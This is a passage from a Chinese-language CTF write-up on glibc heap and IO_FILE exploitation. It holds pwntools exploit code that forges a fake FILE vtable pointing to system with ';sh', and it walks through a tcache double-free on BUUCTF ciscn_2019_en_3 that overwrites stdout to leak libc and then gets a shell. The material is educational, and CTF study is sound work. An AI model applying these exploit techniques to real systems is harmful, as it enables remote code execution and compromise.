<span class="c1">#padding</span>
<span class="n">fake_file</span> <span class="o">=</span> <span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span> <span class="o">*</span> <span class="p">(</span><span class="n">fake_file_addr</span> <span class="o">-</span> <span class="n">fd_addr</span> <span class="o">-</span><span class="mi">4</span><span class="p">)</span>

<span class="c1">#file struct</span>
<span class="n">fake_file</span> <span class="o">+=</span> <span class="p">((</span><span class="n">p32</span><span class="p">(</span><span class="mh">0xffffdfff</span><span class="p">)</span> <span class="o">+</span> <span class="s2">";sh"</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x94</span><span class="p">,</span> <span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span>

<span class="c1">#fake vtable_addr</span>
<span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">fake_file_addr</span> <span class="o">+</span> <span class="mh">0x98</span><span class="p">)</span>   

<span class="c1">#fake_vtables     </span>
<span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span><span class="o">*</span><span class="mi">21</span>
<span class="nb">exit</span><span class="p">(</span><span class="n">name</span> <span class="o">+</span> <span class="n">fake_file</span><span class="p">)</span>
</pre></div>
</li>
<li>
<p><a href="https://buuoj.cn/challenges" target="_blank">BUUCTF ciscn_2019_en_3</a></p>
<ul>
<li>
<p>这是个ubuntu18下面的堆利用。（前面记录过的Tcache机制）</p>
<ul>
<li>
<p>漏洞分析，程序只提供了add和delete功能（edit和show是无效的）。其中add操作虽然没有溢出，但却是对输入无截断的。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191015085326-32061a06-eee6-1.png"/></p>
</li>
<li>
<p>漏洞在delete下，存在double free（dup）</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191015085343-3c351f90-eee6-1.png"/></p>
</li>
</ul>
</li>
<li>
<p>利用思路</p>
<ul>
<li>这题最重要在于如何泄露libc地址。由于没有可以正常输出chunk内容的方式，一般向这种直接没办法正常输出的，就是需要IO登场了。</li>
<li>输出，自然是s在stdout上做文章。</li>
<li>最终，我们只需要改写_IO_write_base，指向一个地址，该地址可以泄露出__IO_file_jumps地址。</li>
</ul>
</li>
<li>
<p>利用过程（exp详解）</p>
<ul>
<li>
<p>利用unsorted bin和tcache重叠（错位）的过程中，写入tcache第一个chunk的fd指向main_arena。和stdout相差就是偏移的差别，完全可以爆破。</p>
<div class="highlight"><pre><span></span><span class="n">prepare</span><span class="p">()</span>
  <span class="n">add</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span> <span class="s1">'0000'</span><span class="p">)</span>
  <span class="n">add</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span> <span class="s1">'1111'</span><span class="p">)</span>
  <span class="n">add</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span> <span class="s1">'2222'</span><span class="p">)</span>
  <span class="n">add</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span> <span class="s1">'3333'</span><span class="p">)</span>
  <span class="n">add</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span> <span class="s1">'4444'</span><span class="p">)</span>
  <span class="n">add</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span> <span class="s1">'5555'</span><span class="p">)</span>
  <span class="n">add</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span> <span class="s1">'6666'</span><span class="p">)</span>
  <span class="n">add</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span> <span class="s1">'7777'</span><span class="p">)</span>
  <span class="n">add</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span> <span class="s1">'8888'</span><span class="p">)</span>           <span class="c1">#avoid consilate with top chunk</span>

  <span class="c1">#fill the tcache</span>
  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
      <span class="n">delete</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>

  <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="s1">'b printf'</span><span class="p">)</span>
  <span class="n">dbg</span><span class="p">()</span>
  <span class="c1">#free into unsorted bin</span>
  <span class="n">delete</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
  <span class="c1">#double free 6, 5 which is near to idx7, into unsorted bin,</span>
  <span class="n">delete</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>               
  <span class="n">delete</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
</pre></div>
<p>此时，unsorted bin和tcache已经存存在重叠。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191015085413-4e10432a-eee6-1.png"/></p>
</li>
<li>
<p>再请求chunk，这一次使得我们可以写入tcache的fd指针。</p>
<div class="highlight"><pre><span></span><span class="n">add</span><span class="p">(</span><span class="mh">0xa0</span><span class="p">,</span> <span class="s1">'a'</span><span class="o">*</span><span class="mh">0x90</span> <span class="o">+</span> <span class="s1">'</span><span class="se">\x60\x87</span><span class="s1">'</span><span class="p">)</span> <span class="c1">#idx8 from unsorted bin idx5\6,  overwrite                               #idx5's fd is stdout</span>
</pre></div>
<p>可以看到，tcache的fd指针已经改写了；发现我们伪造的和stdout不一样，没关系，在调试的时候，可以手动改一下。<strong>set {unsigned int}addr=value</strong></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191015085428-57076c60-eee6-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191015085505-6d86c65c-eee6-1.png"/></p>
</li>
<li>
<p>分配两次两次，可以得到stdout的chunk。</p>
</li>
<li>
<p>我们先看一看stdout的结构。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191015085449-63ddf102-eee6-1.png"/></p>
<p>注意，上面标注的1的位置就是_IO_write_base，2是__IO_file_jumps的位置。换句话说，我们把1低位覆盖为0，就可以泄露libc地址。</p>
<div class="highlight"><pre><span></span><span class="c1">#get a chunk from points to stdout</span>
  <span class="n">add</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xfbad1800</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span> <span class="o">+</span> <span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">)</span>  <span class="c1">#idx10 change _flags, _IO_write_base                    </span>

  <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span>
  <span class="n">leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mh">0x58</span><span class="p">:])</span>                                 <span class="c1">#io_file jump</span>
  <span class="k">print</span> <span class="s2">"leak ==&gt; "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span>
</pre></div>
<p>_flags和其他检查的绕过根据上面提到的<strong>利用fwrite</strong>任意读来构造。</p>
<p>已经可以拿到了libc地址。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191015085532-7d1c81e2-eee6-1.png"/></p>
</li>
<li>
<p>其他的就是和double dup一样的操作拿到shell。这里有个坑就是，不可以继续add和tcache存有同样大小的chunk，因为我们改过fd导致后面的chunk都是不合法的，会触发异常。具体地，调试的时候注意调整。</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 data-content="1" id="9a3f8bdc512d4b8ec5688c93a8ca4ed3">学习链接</h4>
<ul>
<li><a href="https://www.jianshu.com/p/a6354fa4dbdf" target="_blank">IO_FILE通用利用模板</a></li>
<li><a href="https://www.slideshare.net/AngelBoy1/" target="_blank">AngleBoy关于IO_FILE的Slide</a></li>
</ul>
</div>
</div>